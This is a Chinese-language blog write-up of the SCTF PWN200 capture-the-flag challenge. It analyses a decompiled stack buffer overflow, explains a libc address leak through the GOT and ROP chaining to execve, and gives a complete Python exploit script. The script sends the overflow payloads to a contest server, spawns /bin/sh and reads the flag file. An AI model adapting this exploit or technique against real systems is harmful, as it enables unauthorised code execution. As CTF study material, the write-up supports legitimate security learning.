---
title: SCTF PWN200 WriteUp
author: Ripples
layout: post
permalink: /sctf-pwn200-writeup/
views:
  - 395
categories:
  - CTF
tags:
  - buffer overflow
  - CTF
  - ROP
  - SCTF
  - WriteUp
---
<p style="text-indent: 2em;">
  现在总算是考完试了，虽说也没能闲下来，但至少心里没考试前那么蛋疼了，就抽点空把之前的writeup给补上……
</p>

<p style="text-indent: 2em;">
  不过时间有点久了，可能细节不一定能记得那么清楚了，大概写下就是了~~~
</p>

<p style="text-indent: 2em;">
  IDA反编译得到的程序如下：
</p>

<!--more-->

<pre class="brush:cpp;toolbar:false">ssize_t&nbsp;__cdecl&nbsp;sub_80484AC()
{
&nbsp;&nbsp;ssize_t&nbsp;result;&nbsp;//&nbsp;eax@3
&nbsp;&nbsp;char&nbsp;v1;&nbsp;//&nbsp;[sp+1Ch]&nbsp;[bp-9Ch]@1
&nbsp;&nbsp;int&nbsp;buf;&nbsp;//&nbsp;[sp+9Ch]&nbsp;[bp-1Ch]@1
&nbsp;&nbsp;int&nbsp;v3;&nbsp;//&nbsp;[sp+A0h]&nbsp;[bp-18h]@1
&nbsp;&nbsp;int&nbsp;v4;&nbsp;//&nbsp;[sp+A4h]&nbsp;[bp-14h]@1
&nbsp;&nbsp;int&nbsp;v5;&nbsp;//&nbsp;[sp+A8h]&nbsp;[bp-10h]@1
&nbsp;&nbsp;size_t&nbsp;nbytes;&nbsp;//&nbsp;[sp+ACh]&nbsp;[bp-Ch]@1
&nbsp;&nbsp;nbytes&nbsp;=&nbsp;16;
&nbsp;&nbsp;buf&nbsp;=&nbsp;0;
&nbsp;&nbsp;v3&nbsp;=&nbsp;0;
&nbsp;&nbsp;v4&nbsp;=&nbsp;0;
&nbsp;&nbsp;v5&nbsp;=&nbsp;0;
&nbsp;&nbsp;memset(&v1,&nbsp;0,&nbsp;0x80u);
&nbsp;&nbsp;write(1,&nbsp;"input&nbsp;name:",&nbsp;0xCu);
&nbsp;&nbsp;read(0,&nbsp;&buf,&nbsp;nbytes&nbsp;+&nbsp;1);
&nbsp;&nbsp;if&nbsp;(&nbsp;strlen((const&nbsp;char&nbsp;*)&buf)&nbsp;-&nbsp;1&nbsp;&gt;&nbsp;9&nbsp;||&nbsp;strncmp("syclover",&nbsp;(const&nbsp;char&nbsp;*)&buf,&nbsp;8u)&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;-1;
&nbsp;&nbsp;}
&nbsp;&nbsp;else
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;write(1,&nbsp;"input&nbsp;slogan:",&nbsp;0xEu);
&nbsp;&nbsp;&nbsp;&nbsp;read(0,&nbsp;&v1,&nbsp;nbytes);
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;write(1,&nbsp;&v1,&nbsp;nbytes);
&nbsp;&nbsp;}
&nbsp;&nbsp;return&nbsp;result;
}</pre>

<p style="text-indent: 2em;">
  这题很明显，在第一次读入的时候，存在着溢出的问题，而这一次溢出正好可以修改到下一次读入的时候的长度那个变量，这样就可以在下一次读入的时候破掉长度限制，从而可以在下一次读入的时候进一步的溢出，修改返回值地址。
</p>

<p style="text-indent: 2em;">
  这里需要注意的是，它第一次读入之后和字符串syclover用strncmp做了个比较，这里比较的长度是8，并且strlen的判断保证读入字符串长度要不大于10，而我们溢出所需要的长度不止10，那么这里就得注意到读入字符串的时候用的read函数，而read的特点是不会被x00这种字符断掉，那么正好可以在读入的字符串中间插入x00，这样就可以过掉strlen和strncmp的判断了。
</p>

<p style="text-indent: 2em;">
  接下来就是一个困扰我好久的问题，这题的堆栈都是不可运行的，我们无法传入shellcode，而调用execve等系统调用需要知道其地址，而由于是nc过去的，不像之前做wargame的时候都是ssh上去，可以看到系统函数的地址。那么我们这里就要注意到，它给的文件中，除了主程序，还有一个libc.so，那么这里很明确，就是需要我们通过给的libc来计算出我们所需函数的地址（libc载入之后各函数的相对位置不变）。可是计算地址需要我们知道某一个libc中函数的地址，如何拿到一个函数的地址着实让我想了好久。
</p>

<p style="text-indent: 2em;">
  其实这个问题本身并不难，只是由于太习惯了做wargame时候那种SSH上去直接看的方式，所以思路没打开，其实我们很显然可以通过调用write函数来把某一个系统函数真正的地址输出除了，write函数由于它程序中使用了，所以GOT表中是由对应项的，我们可以很轻松的调用。
</p>

<p style="text-indent: 2em;">
  最后，当我们通过这样的方式输出并计算得到execve的函数地址之后，如果再次重新运行溢出其实还是会有问题的，这里就涉及到服务器端实现的方法了，服务器端应该是对于每一个请求，单独载入对应的libc运行程序，所以每一次请求的libc地址是会不同的，也就是说我们需要在一次请求中拿到地址，然后计算出execve地址后再调用，这很容易就会想到是在一轮函数调用之后，控制程序返回到整个程序的开头（栈的结构使得我们有一次机会可以控制我们溢出调用函数后返回的位置，这个在之前做wargame的时候就有过），然后开始全新的一轮，这样我们就有机会一次次的溢出，调用我们所需要的函数。其实这个方法也有个专门的名称，叫ROP(Return-oriented programming)，我也是比完才知道……
</p>

<p style="text-indent: 2em;">
  至此，整个攻击流程已经清楚，下面是我比赛时的程序：
</p>

<pre class="brush:python;toolbar:false">#!/usr/bin/env&nbsp;python
#encoding:utf-8

import&nbsp;socket
import&nbsp;binascii

s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
s.connect((&#39;218.2.197.248&#39;,&nbsp;10001))
s.recv(100)

s.send("sycloverx00aaaaaaaxb4""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb""xa0x83x04x08""xacx84x04x08""x01x00x00x00""x50x98x04x08""x04x00x00x00")
result&nbsp;=&nbsp;s.recv(100)
while&nbsp;result.find(&#39;slogan&#39;)&nbsp;==&nbsp;-1&nbsp;or&nbsp;result.find(&#39;slogan&#39;)&nbsp;+&nbsp;8&nbsp;&gt;&nbsp;len(result)&nbsp;-&nbsp;4:
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;+=&nbsp;s.recv(100)

print&nbsp;result
read_addr&nbsp;=&nbsp;binascii.hexlify(result[result.find(&#39;slogan&#39;)&nbsp;+&nbsp;8:][:4][::-1])
print&nbsp;&#39;0x%s&#39;&nbsp;%&nbsp;read_addr

s.send("sycloverx00aaaaaaaxb4""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb""xa0x83x04x08""xacx84x04x08""x01x00x00x00""x60x98x04x08""x04x00x00x00")
result&nbsp;=&nbsp;s.recv(100)
while&nbsp;result.find(&#39;slogan&#39;)&nbsp;==&nbsp;-1&nbsp;or&nbsp;result.find(&#39;slogan&#39;)&nbsp;+&nbsp;8&nbsp;&gt;&nbsp;len(result)&nbsp;-&nbsp;4:
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;+=&nbsp;s.recv(100)

print&nbsp;result
write_addr&nbsp;=&nbsp;binascii.hexlify(result[result.find(&#39;slogan&#39;)&nbsp;+&nbsp;8:][:4][::-1])
print&nbsp;&#39;0x%s&#39;&nbsp;%&nbsp;write_addr

print&nbsp;hex(0xb8240&nbsp;-&nbsp;0xde3a0&nbsp;+&nbsp;int(read_addr,&nbsp;16))

s.send("sycloverx00aaaaaaaxb4""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb""x60x83x04x08""xacx84x04x08""x00x00x00x00""x68x98x04x08""x08x00x00x00")
s.send("/bin/shx00")
while&nbsp;result.find(&#39;slogan&#39;)&nbsp;==&nbsp;-1:
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;+=&nbsp;s.recv(100)

print&nbsp;result

s.send("sycloverx00aaaaaaaxb4""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb""xa0x83x04x08""xacx84x04x08""x01x00x00x00""x68x98x04x08""x08x00x00x00")
result&nbsp;=&nbsp;s.recv(100)
while&nbsp;result.find(&#39;slogan&#39;)&nbsp;==&nbsp;-1&nbsp;or&nbsp;result.find(&#39;slogan&#39;)&nbsp;+&nbsp;8&nbsp;&gt;&nbsp;len(result)&nbsp;-&nbsp;8:
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;+=&nbsp;s.recv(100)

print&nbsp;result
print&nbsp;result[result.find(&#39;slogan&#39;)&nbsp;+&nbsp;8:][:8]

s.send("sycloverx00aaaaaaaxb4""aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb"&nbsp;+&nbsp;binascii.unhexlify(hex(0x3f430&nbsp;-&nbsp;0xde3a0&nbsp;+&nbsp;int(read_addr,&nbsp;16))[2:])[::-1]&nbsp;+&nbsp;"xacx84x04x08""x68x98x04x08"&nbsp;+&nbsp;&#39;x00&#39;&nbsp;*&nbsp;8)

s.send(&#39;cat&nbsp;/home/pwn1/ffLLag_/flagn&#39;)
while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;s.recv(100)</pre>

<p style="text-indent: 2em;">
  其中前两次溢出分别是取得read和write载入内存的真实地址（其实只要获取一个就好）；第三次溢出是将/bin/sh这个字符串写入内存中一个固定位置，因为execve的参数中需要用，这里我是选择写在GOT表所在位置，因为可以肯定有写权限，不会崩；第四次溢出是输出看一下写入是否正确，可以不用；第五次溢出就是调用execve运行shell了。
</p>

<p style="text-indent: 2em;">
  不得不说，这题其实不难，思路很清楚，只是由于之前从没接触过这种形式的，所以浪费了不少时间……
</p>

<p style="line-height: 16px; text-indent: 2em;">
  <img src="http://geekjayvic.sinaapp.com/wp-content/plugins/wp-ueditor2/ueditor/dialogs/attachment/fileTypeImages/icon_rar.gif" /><a href="http://geekjayvic-wordpress.stor.sinaapp.com/uploads/2015/01/pwn200.zip">pwn200.zip</a>
</p>
